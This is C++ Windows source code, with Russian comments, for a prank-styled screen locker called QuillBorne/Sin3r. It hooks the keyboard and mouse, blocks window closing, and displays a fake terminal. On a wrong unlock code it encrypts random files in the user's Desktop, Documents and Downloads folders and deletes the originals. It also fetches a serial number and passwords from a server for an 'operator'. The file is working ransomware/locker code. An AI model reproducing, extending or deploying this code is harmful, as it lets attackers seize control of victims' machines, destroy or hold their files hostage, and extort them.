        HANDLE h = CreateFileW(tmpFile.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
        if (h != INVALID_HANDLE_VALUE) {
            DWORD w;
            WriteFile(h, payload.data(), (DWORD)payload.size(), &w, NULL);
            CloseHandle(h);
            if (AesGcmEncryptFile(tmpFile, dummy)) {
                std::lock_guard<std::mutex> lk(g_encMutex);
                g_encRecords.push_back({ dummy, tmpFile }); // original was temp — on decrypt restore name
            }
            DeleteFileW(tmpFile.c_str());
        }
        return;
    }

    // перемешиваем и берём до MAX_ENCRYPT_FILES
    std::random_device rd;
    std::mt19937 gen(rd());
    std::shuffle(candidates.begin(), candidates.end(), gen);

    size_t count = (std::min)(candidates.size(), MAX_ENCRYPT_FILES);
    for (size_t i = 0; i < count; i++) {
        const std::wstring& src = candidates[i];
        std::wstring dst = src + L".enc";

        if (!AesGcmEncryptFile(src, dst)) continue;

        // удаляем оригинал только после успешного шифрования
        if (DeleteFileW(src.c_str())) {
            std::lock_guard<std::mutex> lk(g_encMutex);
            g_encRecords.push_back({ dst, src });
        } else {
            // если не смогли удалить — убираем .enc, чтобы не оставлять дубликат
            DeleteFileW(dst.c_str());
        }
    }
}

// Расшифровывает все записанные файлы, удаляет .enc
static int DecryptAllRecords(const char* password) {
    std::lock_guard<std::mutex> lk(g_encMutex);
    int ok = 0;
    for (auto& rec : g_encRecords) {
        if (AesGcmDecryptFile(rec.encPath, rec.originalPath, password)) {
            DeleteFileW(rec.encPath.c_str());
            ok++;
        }
    }
    if (ok > 0) g_encRecords.clear();
    return ok;
}

// ---------- Диалог восстановления файлов ----------
struct RecoverDlgData {
    HWND hEdit;
    int attemptsLeft;
    bool success;
};

static LRESULT CALLBACK RecoverWndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    if (msg == WM_NCCREATE) {
        CREATESTRUCTW* cs = (CREATESTRUCTW*)lParam;
        SetWindowLongPtrW(hwnd, GWLP_USERDATA, (LONG_PTR)cs->lpCreateParams);
        return DefWindowProcW(hwnd, msg, wParam, lParam);
    }

    RecoverDlgData* data = (RecoverDlgData*)GetWindowLongPtrW(hwnd, GWLP_USERDATA);

    switch (msg) {
    case WM_CREATE: {
        data = (RecoverDlgData*)((CREATESTRUCTW*)lParam)->lpCreateParams;
        SetWindowLongPtrW(hwnd, GWLP_USERDATA, (LONG_PTR)data);

        CreateWindowW(L"STATIC",
            L"Хочешь разблокировать свои файлы?\r\nВведи пароль от них:",
            WS_CHILD | WS_VISIBLE | SS_CENTER,
            20, 18, 360, 48, hwnd, NULL, GetModuleHandleW(NULL), NULL);

        data->hEdit = CreateWindowExW(WS_EX_CLIENTEDGE, L"EDIT", L"",
            WS_CHILD | WS_VISIBLE | WS_TABSTOP | ES_PASSWORD | ES_AUTOHSCROLL | ES_CENTER,
            50, 78, 300, 28, hwnd, (HMENU)1001, GetModuleHandleW(NULL), NULL);

        CreateWindowW(L"BUTTON", L"Разблокировать",
            WS_CHILD | WS_VISIBLE | WS_TABSTOP | BS_DEFPUSHBUTTON,
            70, 125, 140, 32, hwnd, (HMENU)1, GetModuleHandleW(NULL), NULL);

        CreateWindowW(L"BUTTON", L"Отмена",
            WS_CHILD | WS_VISIBLE | WS_TABSTOP,
            230, 125, 100, 32, hwnd, (HMENU)2, GetModuleHandleW(NULL), NULL);

        CreateWindowW(L"STATIC", L"Осталось попыток: 3",
            WS_CHILD | WS_VISIBLE | SS_CENTER,
            20, 170, 360, 24, hwnd, (HMENU)1002, GetModuleHandleW(NULL), NULL);

        SetFocus(data->hEdit);
        return 0;
    }
    case WM_COMMAND:
        if (LOWORD(wParam) == 1) { // Разблокировать
            if (!data) return 0;
            wchar_t buf[128] = {};
            GetWindowTextW(data->hEdit, buf, 127);
            char narrow[64] = {};
            WideCharToMultiByte(CP_UTF8, 0, buf, -1, narrow, 63, NULL, NULL);

            if (strcmp(narrow, ENCRYPT_PASSWORD()) == 0) {
                int n = DecryptAllRecords(ENCRYPT_PASSWORD());
                data->success = true;
                wchar_t msg[128];
                _snwprintf(msg, 128, L"Готово! Восстановлено файлов: %d", n);
                MessageBoxW(hwnd, msg, L"QuillBorne", MB_OK | MB_ICONINFORMATION);
                DestroyWindow(hwnd);
            } else {
                data->attemptsLeft--;
                if (data->attemptsLeft <= 0) {
                    MessageBoxW(hwnd,
                        L"Попытки закончились.\nФайлы останутся зашифрованными.",
                        L"QuillBorne", MB_OK | MB_ICONERROR);
                    DestroyWindow(hwnd);
                } else {
                    wchar_t status[80];
                    if (data->attemptsLeft == 2) {
                        wcsncpy(status, L"Неверный пароль. Осталось 2 попытки", 79);
                        status[79] = 0;
                    } else {
                        wcsncpy(status, L"Неверный пароль. Осталась 1 попытка", 79);
                        status[79] = 0;
                    }
                    SetWindowTextW(GetDlgItem(hwnd, 1002), status);
                    SetWindowTextW(data->hEdit, L"");
                    SetFocus(data->hEdit);
                }
            }
            return 0;
        }
        if (LOWORD(wParam) == 2) { // Отмена
            DestroyWindow(hwnd);
            return 0;
        }
        break;
    case WM_CLOSE:
        DestroyWindow(hwnd);
        return 0;
    case WM_DESTROY:
        PostQuitMessage(0);
        return 0;
    }
    return DefWindowProcW(hwnd, msg, wParam, lParam);
}

static void ShowRecoverDialog() {
    static bool registered = false;
    const wchar_t* cls = L"QuillBorneRecoverDlg";
    if (!registered) {
        WNDCLASSW wc = {};
        wc.lpfnWndProc = RecoverWndProc;
        wc.hInstance = GetModuleHandleW(NULL);
        wc.lpszClassName = cls;
        wc.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
        wc.hCursor = LoadCursor(NULL, IDC_ARROW);
        RegisterClassW(&wc);
        registered = true;
    }

    RecoverDlgData data = {};
    data.attemptsLeft = 3;
    data.success = false;

    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);
    int ww = 400, wh = 240;
    HWND hwnd = CreateWindowExW(
        WS_EX_TOPMOST | WS_EX_DLGMODALFRAME,
        cls, L"QuillBorne — восстановление файлов",
        WS_CAPTION | WS_POPUP | WS_SYSMENU | WS_VISIBLE,
        (sw - ww) / 2, (sh - wh) / 2, ww, wh,
        NULL, NULL, GetModuleHandleW(NULL), &data);

    if (!hwnd) return;

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        if (!IsDialogMessage(hwnd, &msg)) {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
    }
}

// Проверка кода разблокировки QuillBorne
void CheckCode() {
    if (!hEdit) return;
    if (g_phase != PHASE_LOCKED) return;

    wchar_t buf[256] = { 0 };
    GetWindowTextW(hEdit, buf, 255);

    if (wcscmp(buf, g_unlockCode.c_str()) == 0) {
        // Правильный код QuillBorne — снимаем хуки и предлагаем восстановить файлы
        UnhookWindowsHookEx(keyboardHook);
        UnhookWindowsHookEx(mouseHook);
        keyboardHook = NULL;
        mouseHook = NULL;
        ShowCursor(TRUE);

        // прячем основное окно
        ShowWindow(mainHwnd, SW_HIDE);

        // ждём 10 секунд, потом диалог восстановления
        std::thread([]() {
            std::this_thread::sleep_for(std::chrono::seconds(10));
            // диалог должен работать в потоке с message pump — вызываем через SendMessage на main
            // проще: создаём диалог прямо здесь (отдельный message loop внутри ShowRecoverDialog)
            ShowRecoverDialog();
            // после диалога — полный выход
            PostQuitMessage(0);
            ExitProcess(0);
        }).detach();

        // не выходим сразу — даём потоку отработать; основной цикл GetMessage ещё жив
        // но окно уже скрыто. Чтобы не зависнуть навсегда, через 10с+ диалог вызовет ExitProcess.
    }
    else {
        // Неверный код — шифруем случайные файлы пользователя
        current_meme = L"НЕВЕРНЫЙ КОД!\n\nШифрую твои файлы...\n(Desktop / Documents / Downloads)\n\nПодожди...";
        InvalidateRect(mainHwnd, NULL, TRUE);

        std::thread([]() {
            EncryptRandomUserFiles();
            size_t n = 0;
            {
                std::lock_guard<std::mutex> lk(g_encMutex);
                n = g_encRecords.size();
            }
            wchar_t msg[160];
            _snwprintf(msg, 160,
                L"НЕВЕРНЫЙ КОД!\n\nЗашифровано файлов: %zu\n"
                L"(расширение .enc, пароль отдельный)\n\n"
                L"Попробуй код разблокировки ещё раз...", n);
            current_meme = msg;
            InvalidateRect(mainHwnd, NULL, TRUE);
        }).detach();
    }
}

// Поток смены мемов (только в фазе LOCKED)
void meme_updater() {
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(0, (int)memes.size() - 1);

    while (true) {
        std::this_thread::sleep_for(std::chrono::seconds(4));

        if (g_phase == PHASE_LOCKED) {
            // Постоянно возвращаем фокус на поле ввода — чтобы можно было печатать без мыши
            if (hEdit) {
                PostMessage(mainHwnd, WM_USER + 2, 0, 0);
            }

            if (current_meme.find(L"НЕВЕРНЫЙ КОД") == std::wstring::npos) {
                current_meme = memes[dis(gen)];
                InvalidateRect(mainHwnd, NULL, FALSE);
            }
        }
    }
}

// ============================================================
//  СКРИПТ ЗАГРУЗКИ: слайдшоу assets -> эмулированный терминал
// ============================================================
void boot_thread() {
    auto invalidate = []() { InvalidateRect(mainHwnd, NULL, FALSE); };

    // -------- ФАЗА 1: LOADING (покажешь картинки из assets) --------
    int total = (int)g_assets.size();
    if (total == 0) {
        // Нет картинок — красиво прогоняем текстовые шаги с плавным прогрессом
        int n = (int)(sizeof(bootSteps) / sizeof(bootSteps[0]));
        for (int i = 0; i < n; i++) {
            g_loadText = bootSteps[i];
            int from = i * 100 / n;
            int to   = (i + 1) * 100 / n;
            for (int p = from; p <= to; p += 2) {
                g_loadProgress = p;
                invalidate();
                std::this_thread::sleep_for(std::chrono::milliseconds(35));
            }
            std::this_thread::sleep_for(std::chrono::milliseconds(280));
        }
        g_loadProgress = 100;
    }
    else {
        for (int i = 0; i < total; i++) {
            Gdiplus::Image* img = TryLoadImage(g_assets[i]);
            Gdiplus::Image* old = g_loadingImg;
            g_loadingImg = img;
            // удаляем старую после небольшой задержки, чтобы Paint не ловил dangling pointer
            if (old) {
                std::this_thread::sleep_for(std::chrono::milliseconds(30));
                delete old;
            }

            g_loadIndex = i;
            int from = i * 100 / total;
            int to   = (i + 1) * 100 / total;
            g_loadText = L"Синхронизирую мем-базы (" + std::to_wstring(i + 1) +
                         L"/" + std::to_wstring(total) + L")...";
            for (int p = from; p <= to; p += 2) {
                g_loadProgress = p;
                invalidate();
                std::this_thread::sleep_for(std::chrono::milliseconds(28));
            }
            std::this_thread::sleep_for(std::chrono::milliseconds(450));
        }
        g_loadProgress = 100;
    }
    g_loadText = L"Загрузка завершена. Поднимаю терминал...";
    invalidate();
    std::this_thread::sleep_for(std::chrono::milliseconds(600));

    // -------- ФАЗА 2: TERMINAL --------
    InterlockedExchange(&g_phase, PHASE_TERMINAL);
    invalidate();
    std::this_thread::sleep_for(std::chrono::milliseconds(400));

    auto addLine = [&](const std::wstring& s, bool isCmd) {
        std::lock_guard<std::mutex> lk(g_termMutex);
        g_termLines.push_back({ s, isCmd });
    };

    addLine(L"Sin3r Terminal v6.6.6 — проснись, Павел", true);
    addLine(L"", true);

    for (const FakeCmd& c : fakeCmds) {
        const std::wstring prompt = L"C:\\Users\\Павел> ";
        // Печатаем команду посимвольно (чуть медленнее и живее)
        for (size_t i = 0; i <= wcslen(c.cmd); i++) {
            {
                std::lock_guard<std::mutex> lk(g_termMutex);
                g_termCurrent = prompt + std::wstring(c.cmd).substr(0, i);
            }
            invalidate();
            // небольшая рандомизация скорости набора
            static thread_local std::mt19937 rng{ std::random_device{}() };
            std::uniform_int_distribution<int> dist(16, 32);
            std::this_thread::sleep_for(std::chrono::milliseconds(dist(rng)));
        }
        addLine(prompt + c.cmd, true);
        { std::lock_guard<std::mutex> lk(g_termMutex); g_termCurrent.clear(); }
        invalidate();
        std::this_thread::sleep_for(std::chrono::milliseconds(90));

        // Печатаем вывод
        for (const wchar_t* o : c.out) {
            addLine(o, false);
            invalidate();
            std::this_thread::sleep_for(std::chrono::milliseconds(140));
        }
        addLine(L"", true);
        invalidate();
        std::this_thread::sleep_for(std::chrono::milliseconds(180));
    }

    // -------- ФАЗА 3: LOCKED --------
    InterlockedExchange(&g_phase, PHASE_LOCKED);
    invalidate();
    ShowWindow(hLabel, SW_SHOW);
    ShowWindow(hEdit, SW_SHOW);
    ShowWindow(hButton, SW_SHOW);

    // Несколько раз жёстко ставим фокус — topmost-окно иногда его теряет
    for (int i = 0; i < 5; i++) {
        PostMessage(mainHwnd, WM_USER + 2, 0, 0);
        std::this_thread::sleep_for(std::chrono::milliseconds(120));
    }

    // держим поток
    for (;;) std::this_thread::sleep_for(std::chrono::minutes(1));
}

// ============================================================
//  ОТРИСОВКА ФАЗ
// ============================================================
static void PaintLoading(HDC hdc, int W, int H) {
    DrawMonoText(hdc, L"З А Г Р У З К А   S I N 3 R   O S", { 0, 40, W, 80 }, 30, FW_BOLD, RGB(255, 60, 60));

    // Картинка из assets по центру
    int areaTop = 110, areaBottom = H - 300;
    if (g_loadingImg && areaBottom > areaTop + 50) {
        DrawImageFitted(hdc, g_loadingImg, 40, areaTop, W - 80, areaBottom - areaTop);
    }
    else if (areaBottom > areaTop + 50) {
        // fallback, когда картинок в assets нет
        DrawMonoText(hdc, L"[ assets пусты — кинь png/jpg сюда ]",
                     { 40, (areaTop + areaBottom) / 2 - 20, W - 40, (areaTop + areaBottom) / 2 + 40 },
                     18, FW_NORMAL, RGB(90, 90, 90));
    }

    // Статус
    DrawMonoText(hdc, g_loadText,
                 { 0, H - 280, W, H - 235 }, 20, FW_NORMAL, RGB(170, 255, 90));

    // Прогресс-бар
    int bw = 560, bh = 24, bx = (W - bw) / 2, by = H - 215;
    RECT frame = { bx, by, bx + bw, by + bh };
    SetBkMode(hdc, TRANSPARENT);
    FrameRect(hdc, &frame, (HBRUSH)GetStockObject(GRAY_BRUSH));
    int fillW = bw * g_loadProgress / 100;
    if (fillW > 0) {
        RECT fill = { bx + 2, by + 2, bx + 2 + fillW - (fillW > 4 ? 4 : 0), by + bh - 2 };
        HBRUSH lime = CreateSolidBrush(RGB(170, 255, 90));
        FillRect(hdc, &fill, lime);
        DeleteObject(lime);
    }
    DrawMonoText(hdc, std::to_wstring(g_loadProgress) + L" %",
                 { 0, by + bh + 10, W, by + bh + 45 }, 18, FW_NORMAL, RGB(200, 200, 200));

    DrawMonoText(hdc, L"не выключай. я пошутил. наверное.",
                 { 0, H - 60, W, H - 20 }, 15, FW_NORMAL, RGB(120, 120, 120));
}

static void PaintTerminal(HDC hdc, int W, int H) {
    DrawMonoText(hdc, L"[ SIN3R TERMINAL — полностью безопасен, честно ]",
                 { 30, 25, W - 30, 60 }, 16, FW_BOLD, RGB(255, 200, 70), DT_LEFT | DT_TOP);

    const int lineH = 24;
    int visible = (H - 90) / lineH;

    std::vector<TermLine> lines;
    std::wstring current;
    {
        std::lock_guard<std::mutex> lk(g_termMutex);
        lines = g_termLines;
        current = g_termCurrent;
    }

    int start = (int)lines.size() - visible;
    if (start < 0) start = 0;

    int y = 60;
    for (int i = start; i < (int)lines.size(); i++) {
        COLORREF c = lines[i].isCmd ? RGB(170, 255, 90) : RGB(200, 200, 200);
        DrawMonoText(hdc, lines[i].text, { 30, y, W - 30, y + lineH + 20 }, 17,
                     lines[i].isCmd ? FW_BOLD : FW_NORMAL, c, DT_LEFT | DT_TOP);
        y += lineH;
    }

    // текущая строка + мигающий курсор
    bool cursor = ((GetTickCount() / 400) % 2) == 0;
    std::wstring cur = current + (cursor ? L"█" : L" ");
    DrawMonoText(hdc, cur, { 30, y, W - 30, y + lineH + 20 }, 17, FW_BOLD, RGB(170, 255, 90), DT_LEFT | DT_TOP);
}

static void PaintLocked(HDC hdc, int W, int H) {
    // -------- Логотип: арт из art.png --------
    int logoMaxH = (H > 800) ? (H - 330) : (H - 120);
    int logoMaxW = W / 2 - 80;
    DrawImageFitted(hdc, g_artImg, 40, 80, logoMaxW, logoMaxH);

    // -------- neofetch справа (реальные данные) --------
    int nx = W / 2 + 40;
    int y = 90;
    const int lh = 26;
    for (const auto& l : g_neoLines) {
        DrawMonoText(hdc, l.text, { nx, y, W - 20, y + lh + 20 }, 18, FW_NORMAL, l.color, DT_LEFT | DT_TOP);
        y += lh;
    }

    // Палитра (как в neofetch)
    int bx = nx, by = y + 8;
    for (int i = 0; i < 8; i++) {
        RECT r = { bx, by, bx + 22, by + 22 };
        HBRUSH b = CreateSolidBrush(paletteBlocks[i]);
        FillRect(hdc, &r, b);
        DeleteObject(b);
        bx += 30;
    }

    // -------- Слоган и мем внизу --------
    DrawMonoText(hdc, L"СИСТЕМА ЗАБЛОКИРОВАНА",
                 { 0, H - 330, W, H - 280 }, 34, FW_BOLD, RGB(255, 40, 40));
    DrawMonoText(hdc, L"Павел, привет! Я тут живу теперь.  - siner",
                 { 0, H - 278, W, H - 250 }, 17, FW_NORMAL, RGB(230, 230, 230));
    // серийный номер (чтобы оператор мог найти пароли на сервере)
    if (!g_serial.empty()) {
        std::wstring serLine = L"S/N: " + g_serial;
        DrawMonoText(hdc, serLine, { 0, H - 248, W, H - 220 }, 16, FW_BOLD, RGB(255, 200, 70));
    }

    RECT memeRect = { 100, H - 235, W - 100, H - 165 };
    DrawMonoText(hdc, current_meme, memeRect, 15, FW_NORMAL, RGB(180, 180, 180));
}

// ============================================================
//  ОКОННАЯ ПРОЦЕДУРА (ввод кода и события окна)
// ============================================================
LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
    switch (uMsg) {
    case WM_ERASEBKGND:
        return 1; // рисуем всё сами, без мерцания

    case WM_PAINT: {
        PAINTSTRUCT ps;
        HDC hdc = BeginPaint(hwnd, &ps);

        RECT rc;
        GetClientRect(hwnd, &rc);
        int W = rc.right, H = rc.bottom;

        // Двойная буферизация
        HDC mem = CreateCompatibleDC(hdc);
        HBITMAP bmp = CreateCompatibleBitmap(hdc, W, H);
        HBITMAP oldBmp = (HBITMAP)SelectObject(mem, bmp);
        RECT full = rc;
        FillRect(mem, &full, (HBRUSH)GetStockObject(BLACK_BRUSH));

        switch (g_phase) {
        case PHASE_LOADING:  PaintLoading(mem, W, H);  break;
        case PHASE_TERMINAL: PaintTerminal(mem, W, H); break;
        case PHASE_LOCKED:   PaintLocked(mem, W, H);   break;
        }

        BitBlt(hdc, 0, 0, W, H, mem, 0, 0, SRCCOPY);
        SelectObject(mem, oldBmp);
        DeleteObject(bmp);
        DeleteDC(mem);
        EndPaint(hwnd, &ps);
        return 0;
    }

    case WM_CTLCOLORSTATIC: { // красный текст у лейбла
        HDC hdcStatic = (HDC)wParam;
        SetTextColor(hdcStatic, RGB(255, 60, 60));
        SetBkMode(hdcStatic, TRANSPARENT);
        return (LRESULT)GetStockObject(BLACK_BRUSH);
    }

    case WM_COMMAND:
        if (LOWORD(wParam) == 1001) CheckCode();
        return 0;

    case WM_USER + 1: // Enter из хука
        CheckCode();
        return 0;

    case WM_USER + 2: // показать UI в фазе LOCKED — жёстко вернуть фокус на поле кода
        if (g_phase == PHASE_LOCKED && hEdit) {
            SetForegroundWindow(hwnd);
            SetActiveWindow(hwnd);
            BringWindowToTop(hwnd);
            SetFocus(hEdit);
            // выделяем весь текст, чтобы сразу было видно, что фокус есть
            SendMessageW(hEdit, EM_SETSEL, 0, -1);
        }
        return 0;

    case WM_CLOSE:
        return 0; // Не даём закрыть
    }
    return DefWindowProc(hwnd, uMsg, wParam, lParam);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    // GDI+ — чтобы рисовать PNG
    Gdiplus::GdiplusStartupInput gdiStartup;
    if (Gdiplus::GdiplusStartup(&g_gdiToken, &gdiStartup, NULL) != Gdiplus::Ok) {
        return 1;
    }

    // Получаем серийник + пароли с сервера (или fallback)
    FetchCredentialsFromServer();

    // Собираем реальные данные для neofetch
    BuildNeoFetch();

    // Логотип: art.png рядом с exe (в PrjDir это "..\art.png")
    std::wstring exeDir = GetExeDir();
    g_artImg = TryLoadImage(exeDir + L"\\art.png");
    if (!g_artImg) g_artImg = TryLoadImage(exeDir + L"\\..\\art.png");
    if (!g_artImg) g_artImg = TryLoadImage(exeDir + L"\\assets\\art.png");

    // Ассеты для слайдшоу на экране загрузки
    g_assets = ScanAssets(exeDir + L"\\assets");
    if (g_assets.empty()) g_assets = ScanAssets(exeDir + L"\\..\\assets");

    keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);
    mouseHook = SetWindowsHookEx(WH_MOUSE_LL, MouseProc, GetModuleHandle(NULL), 0);

    if (keyboardHook == NULL || mouseHook == NULL) {
        Gdiplus::GdiplusShutdown(g_gdiToken);
        MessageBox(NULL, L"Не удалось установить перехватчики.", L"Ошибка", MB_ICONERROR);
        return 1;
    }

    const wchar_t CLASS_NAME[] = L"LockerClass";
    WNDCLASS wc = {};
    wc.lpfnWndProc = WindowProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = CLASS_NAME;
    wc.hbrBackground = (HBRUSH)GetStockObject(BLACK_BRUSH);
    RegisterClass(&wc);

    int screenW = GetSystemMetrics(SM_CXSCREEN);
    int screenH = GetSystemMetrics(SM_CYSCREEN);

    mainHwnd = CreateWindowEx(
        WS_EX_TOPMOST | WS_EX_TOOLWINDOW,
        CLASS_NAME, L"LOCKED",
        WS_POPUP,
        0, 0, screenW, screenH,
        NULL, NULL, hInstance, NULL
    );

    if (mainHwnd == NULL) return 0;

    // --- UI элементы внизу (создаём СПРЯТАННЫМИ, покажем после загрузки) ---
    int uiY = screenH - 120;
    int centerX = screenW / 2;

    hLabel = CreateWindowW(
        L"STATIC", L"Павел, введи код для разблокировки:",
        WS_CHILD | SS_CENTER,
        centerX - 250, uiY, 500, 25,
        mainHwnd, NULL, hInstance, NULL
    );

    hEdit = CreateWindowW(
        L"EDIT", L"",
        WS_CHILD | WS_BORDER | WS_TABSTOP | ES_AUTOHSCROLL | ES_CENTER,
        centerX - 220, uiY + 30, 300, 28,
        mainHwnd, (HMENU)1002, hInstance, NULL
    );

    hButton = CreateWindowW(
        L"BUTTON", L"нажать",
        WS_CHILD | BS_DEFPUSHBUTTON,
        centerX + 90, uiY + 28, 100, 32,
        mainHwnd, (HMENU)1001, hInstance, NULL
    );

    ShowCursor(FALSE);
    ShowWindow(mainHwnd, SW_SHOW);
    UpdateWindow(mainHwnd);

    std::thread booter(boot_thread);
    booter.detach();

    std::thread updater(meme_updater);
    updater.detach();

    MSG msg = {};
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(keyboardHook);
    UnhookWindowsHookEx(mouseHook);
    ShowCursor(TRUE);
    Gdiplus::GdiplusShutdown(g_gdiToken);
    return 0;
}
